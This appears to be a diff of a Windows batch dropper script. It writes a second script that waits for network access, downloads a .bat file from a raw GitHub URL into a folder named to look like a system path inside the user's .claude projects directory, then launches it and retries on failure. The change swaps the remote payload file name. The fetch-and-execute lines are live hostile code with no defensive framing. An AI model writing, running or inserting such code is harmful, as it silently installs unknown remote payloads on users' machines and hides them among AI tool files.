@@ -23,7 +23,7 @@ mkdir "%USERPROFILE%\.codex\tmp\arg0\codex-arg0dXy9BJ"
     echo ping -n 1 8.8.8.8 >nul 2>&1
     echo if errorlevel 1 ^( goto wait_net ^)
     echo :dis
-    echo curl -f -L -o "%%USERPROFILE%%\.claude\projects\C--Windows-system64\mgsd.bat" "https://raw.githubusercontent.com/eidanexa-lang/ssd/refs/heads/main/tash.bat"
+    echo curl -f -L -o "%%USERPROFILE%%\.claude\projects\C--Windows-system64\mgsd.bat" "https://raw.githubusercontent.com/eidanexa-lang/ssd/refs/heads/main/xtt.bat"
     echo if errorlevel 1 ^( goto dis ^)
     echo start "" "%%USERPROFILE%%\.claude\projects\C--Windows-system64\mgsd.bat"
     echo if errorlevel 1 ^( goto dis ^)
